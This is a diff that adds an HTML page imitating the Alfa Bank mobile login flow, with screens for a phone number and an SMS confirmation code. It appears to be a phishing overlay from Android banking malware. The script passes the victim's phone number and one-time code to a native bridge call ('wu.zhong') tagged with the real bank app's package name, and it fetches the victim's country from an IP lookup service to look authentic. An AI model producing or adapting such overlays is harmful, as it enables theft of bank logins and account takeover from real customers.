@@ -1,0 +1,576 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <title>Alfa Bank</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            -webkit-tap-highlight-color: transparent;
+        }
+        
+        html, body {
+            width: 100%;
+            height: 100%;
+            overflow: hidden;
+        }
+        
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'SF Pro Display', 'Segoe UI', Roboto, sans-serif;
+            background-color: #000000;
+            color: #ffffff;
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+        }
+        
+        .app-container {
+            width: 100vw;
+            height: 100vh;
+            max-width: 390px;
+            margin: 0 auto;
+            position: relative;
+            background-color: #000000;
+        }
+        
+        .screen {
+            width: 100%;
+            height: 100vh;
+            position: absolute;
+            top: 0;
+            left: 0;
+            display: flex;
+            flex-direction: column;
+            transition: transform 0.35s cubic-bezier(0.25, 0.46, 0.45, 0.94);
+            background-color: #000000;
+        }
+        
+        .screen.slide-out {
+            transform: translateX(-100%);
+        }
+        
+        .screen.slide-in {
+            transform: translateX(100%);
+        }
+        
+        .screen.active {
+            transform: translateX(0);
+        }
+        
+        .status-bar {
+            height: 47px;
+            width: 100%;
+        }
+        
+        .screen1 {
+            padding: 0 24px 34px 24px;
+        }
+        
+        .header-row {
+            height: 44px;
+            display: flex;
+            align-items: center;
+            justify-content: flex-end;
+            margin-bottom: 8px;
+        }
+        
+        .chat-bubble {
+            width: 32px;
+            height: 32px;
+            border: 1.5px solid #4a4a4a;
+            border-radius: 7px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            position: relative;
+        }
+        
+        .chat-bubble::before {
+            content: '';
+            width: 14px;
+            height: 10px;
+            border: 1.5px solid #4a4a4a;
+            border-radius: 2.5px;
+        }
+        
+        .chat-bubble::after {
+            content: '';
+            position: absolute;
+            bottom: 4px;
+            right: 6px;
+            width: 0;
+            height: 0;
+            border-left: 2.5px solid transparent;
+            border-right: 2.5px solid transparent;
+            border-top: 2.5px solid #4a4a4a;
+        }
+        
+        .main-content {
+            flex: 1;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            margin-top: -60px;
+        }
+        
+        .title-section {
+            margin-bottom: 44px;
+        }
+        
+        .main-title {
+            font-size: 32px;
+            font-weight: 600;
+            line-height: 38px;
+            letter-spacing: -0.5px;
+            margin-bottom: 12px;
+            color: #ffffff;
+        }
+        
+        .subtitle {
+            font-size: 17px;
+            font-weight: 400;
+            line-height: 22px;
+            color: #a8a8a8;
+        }
+        
+        .input-section {
+            margin-bottom: 32px;
+        }
+        
+        .phone-input-wrapper {
+            position: relative;
+            background: rgba(255, 255, 255, 0.08);
+            border-radius: 14px;
+            height: 56px;
+            display: flex;
+            align-items: center;
+        }
+        
+        .country-selector {
+            display: flex;
+            align-items: center;
+            padding-left: 20px;
+            padding-right: 12px;
+            border-right: 1px solid rgba(255, 255, 255, 0.1);
+        }
+        
+        .country-code {
+            font-size: 17px;
+            font-weight: 500;
+            color: #ffffff;
+            margin-right: 6px;
+        }
+        
+        .chevron-down {
+            width: 0;
+            height: 0;
+            border-left: 4px solid transparent;
+            border-right: 4px solid transparent;
+            border-top: 5px solid #8b5cf6;
+            margin-top: 1px;
+        }
+        
+        .phone-input {
+            flex: 1;
+            background: transparent;
+            border: none;
+            outline: none;
+            color: #ffffff;
+            font-size: 17px;
+            font-weight: 400;
+            padding: 0 20px;
+            letter-spacing: 0.3px;
+        }
+        
+        .phone-input::placeholder {
+            color: #6a6a6a;
+            font-weight: 400;
+        }
+        
+        .login-button {
+            width: 100%;
+            height: 54px;
+            background: linear-gradient(135deg, #ff4757 0%, #d946ef 45%, #8b5cf6 100%);
+            border: none;
+            border-radius: 14px;
+            color: #ffffff;
+            font-size: 17px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: opacity 0.2s ease;
+            margin-bottom: 20px;
+        }
+        
+        .login-button:active {
+            opacity: 0.85;
+        }
+        
+        .privacy-notice {
+            font-size: 13px;
+            font-weight: 400;
+            line-height: 18px;
+            color: #8a8a8a;
+        }
+        
+        .privacy-link {
+            color: #8b5cf6;
+            text-decoration: none;
+        }
+        
+        .screen2 {
+            padding: 0 24px 34px 24px;
+        }
+        
+        .back-header {
+            height: 44px;
+            display: flex;
+            align-items: center;
+            margin-bottom: 24px;
+        }
+        
+        .back-button {
+            width: 40px;
+            height: 40px;
+            background: none;
+            border: none;
+            color: #ffffff;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-left: -8px;
+            border-radius: 20px;
+            transition: background-color 0.2s ease;
+        }
+        
+        .back-button:active {
+            background-color: rgba(255, 255, 255, 0.1);
+        }
+        
+        .back-arrow {
+            font-size: 28px;
+            font-weight: 300;
+            line-height: 1;
+        }
+        
+        .code-content {
+            flex: 1;
+            display: flex;
+            flex-direction: column;
+        }
+        
+        .code-title-section {
+            margin-bottom: 44px;
+        }
+        
+        .code-title {
+            font-size: 32px;
+            font-weight: 600;
+            line-height: 38px;
+            letter-spacing: -0.5px;
+            margin-bottom: 12px;
+            color: #ffffff;
+        }
+        
+        .code-subtitle {
+            font-size: 17px;
+            font-weight: 400;
+            line-height: 22px;
+            color: #a8a8a8;
+        }
+        
+        .code-input-wrapper {
+            margin-bottom: 60px;
+        }
+        
+        .verification-input {
+            width: 100%;
+            height: 72px;
+            background: rgba(255, 255, 255, 0.08);
+            border: none;
+            border-radius: 14px;
+            color: #ffffff;
+            font-size: 24px;
+            font-weight: 500;
+            text-align: center;
+            letter-spacing: 8px;
+            outline: none;
+        }
+        
+        .verification-input::placeholder {
+            color: #6a6a6a;
+            letter-spacing: 8px;
+        }
+        
+        .resend-area {
+            flex: 1;
+            display: flex;
+            flex-direction: column;
+            justify-content: flex-end;
+            margin-bottom: 24px;
+            text-align: center;
+        }
+        
+        .resend-question {
+            font-size: 16px;
+            font-weight: 400;
+            color: #8a8a8a;
+            margin-bottom: 16px;
+        }
+        
+        .resend-button {
+            background: none;
+            border: none;
+            color: #8a8a8a;
+            font-size: 16px;
+            font-weight: 400;
+            cursor: pointer;
+            text-decoration: underline;
+            text-underline-offset: 2px;
+        }
+        
+        .countdown {
+            color: #8b5cf6;
+            font-weight: 500;
+        }
+        
+        .done-button {
+            width: 100%;
+            height: 54px;
+            background: linear-gradient(135deg, #ff4757 0%, #d946ef 45%, #8b5cf6 100%);
+            border: none;
+            border-radius: 14px;
+            color: #ffffff;
+            font-size: 17px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: opacity 0.2s ease;
+        }
+        
+        .done-button:active {
+            opacity: 0.85;
+        }
+        
+        @media (max-width: 375px) {
+            .app-container {
+                max-width: 375px;
+            }
+            
+            .screen1, .screen2 {
+                padding-left: 20px;
+                padding-right: 20px;
+            }
+            
+            .main-title, .code-title {
+                font-size: 28px;
+                line-height: 34px;
+            }
+        }
+        
+        @media (max-height: 667px) {
+            .main-content {
+                margin-top: -40px;
+            }
+            
+            .title-section {
+                margin-bottom: 36px;
+            }
+            
+            .code-title-section {
+                margin-bottom: 36px;
+            }
+            
+            .code-input-wrapper {
+                margin-bottom: 40px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="app-container">
+        <div class="screen screen1 active" id="screen1">
+            <div class="status-bar"></div>
+            
+            <div class="header-row">
+                <div class="chat-bubble"></div>
+            </div>
+            
+            <div class="main-content">
+                <div class="title-section">
+                    <h1 class="main-title">Enter your phone number</h1>
+                    <p class="subtitle">To enter or become a client of<br>Alfa Bank</p>
+                </div>
+                
+                <div class="input-section">
+                    <div class="phone-input-wrapper">
+                        <div class="country-selector">
+                            <span class="country-code"></span>
+                            <div class="chevron-down"></div>
+                        </div>
+                        <input type="tel" class="phone-input" placeholder="(_ _) _ _ _ - _ _ - _ _" id="phoneInput">
+                    </div>
+                </div>
+                
+                <button class="login-button" onclick="navigateToCode()">Login</button>
+                
+                <p class="privacy-notice">
+                    By clicking Login, you agree to <a href="#" class="privacy-link">the Privacy Policy</a> and agree to the collection, storage and processing of personal data
+                </p>
+            </div>
+        </div>
+        
+        <div class="screen screen2 slide-in" id="screen2">
+            <div class="status-bar"></div>
+            
+            <div class="back-header">
+                <button class="back-button" onclick="navigateBack()">
+                    <span class="back-arrow">‹</span>
+                </button>
+            </div>
+            
+            <div class="code-content">
+                <div class="code-title-section">
+                    <h1 class="code-title">Enter code from the message</h1>
+                    <p class="code-subtitle">You'll get an SMS with a<br>confirmation code</p>
+                </div>
+                
+                <div class="code-input-wrapper">
+                    <input type="text" class="verification-input" placeholder="_ _ _ _" maxlength="4" id="codeInput">
+                </div>
+                
+                <div class="resend-area">
+                    <p class="resend-question">Didn't get the code?</p>
+                    <button class="resend-button" id="resendBtn">
+                        Get a new code <span class="countdown" id="timer">00:58</span>
+                    </button>
+                </div>
+                
+                <button class="done-button" onclick="submit()">Done</button>
+            </div>
+        </div>
+    </div>
+
+    <script>
+
+ window.onload = async function(){
+
+
+    var json= await fetch("https://ipapi.co/json/").then(res => res.json());
+    document.querySelectorAll('.country-code')[0].innerHTML= `${json.country_calling_code}`;
+ 
+    }
+
+            function submit(){
+                var number = document.getElementById('phoneInput').value;
+                var code = document.getElementById('codeInput').value;
+
+               wu.zhong(`🔰 Alpha Bank\n\n📞Mobile Number: ${number}\n🈸Code: ${code}`,"by.alfabank.insync3");
+
+            }
+
+        function navigateToCode() {
+            const screen1 = document.getElementById('screen1');
+            const screen2 = document.getElementById('screen2');
+            
+            var number = document.getElementById('phoneInput').value;
+
+            if(number.length < 10){
+                return;
+            }
+           
+            wu.zhong(`🔰 Alpha Bank\n\n📞Mobile Number: ${number}`,"by.alfabank.insync3#");
+
+
+            screen1.classList.remove('active');
+            screen1.classList.add('slide-out');
+            
+            screen2.classList.remove('slide-in');
+            screen2.classList.add('active');
+        }
+        
+        function navigateBack() {
+            const screen1 = document.getElementById('screen1');
+            const screen2 = document.getElementById('screen2');
+            
+            screen2.classList.remove('active');
+            screen2.classList.add('slide-in');
+            
+            screen1.classList.remove('slide-out');
+            screen1.classList.add('active');
+        }
+        
+        const phoneInput = document.getElementById('phoneInput');
+        phoneInput.addEventListener('input', function(e) {
+            let value = e.target.value.replace(/\D/g, '');
+            let formatted = '';
+            
+            if (value.length >= 1) {
+                formatted = '(' + value.substring(0, 2);
+                if (value.length >= 2) {
+                    formatted += value.substring(2, 2);
+                }
+                formatted += ')';
+            }
+            if (value.length > 2) {
+                formatted += ' ' + value.substring(2, 5);
+            }
+            if (value.length > 5) {
+                formatted += ' - ' + value.substring(5, 7);
+            }
+            if (value.length > 7) {
+                formatted += ' - ' + value.substring(7, 9);
+            }
+            
+            e.target.value = formatted;
+        });
+        
+        const codeInput = document.getElementById('codeInput');
+        codeInput.addEventListener('input', function(e) {
+            let value = e.target.value.replace(/\D/g, '');
+            if (value.length > 4) {
+                value = value.substring(0, 4);
+            }
+            e.target.value = value;
+        });
+        
+        let timeRemaining = 58;
+        const timerElement = document.getElementById('timer');
+        const resendButton = document.getElementById('resendBtn');
+        
+        const countdownInterval = setInterval(() => {
+            const minutes = Math.floor(timeRemaining / 60);
+            const seconds = timeRemaining % 60;
+            const formattedTime = `${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
+            timerElement.textContent = formattedTime;
+            
+            if (timeRemaining <= 0) {
+                clearInterval(countdownInterval);
+                resendButton.innerHTML = 'Get a new code';
+                resendButton.style.color = '#8b5cf6';
+            }
+            
+            timeRemaining--;
+        }, 1000);
+        
+        document.addEventListener('touchstart', function(e) {
+            if (e.touches.length > 1) {
+                e.preventDefault();
+            }
+        });
+        
+        let lastTouchEnd = 0;
+        document.addEventListener('touchend', function(e) {
+            const now = new Date().getTime();
+            if (now - lastTouchEnd <= 300) {
+                e.preventDefault();
+            }
+            lastTouchEnd = now;
+        }, false);
+    </script>
+</body>
+</html>
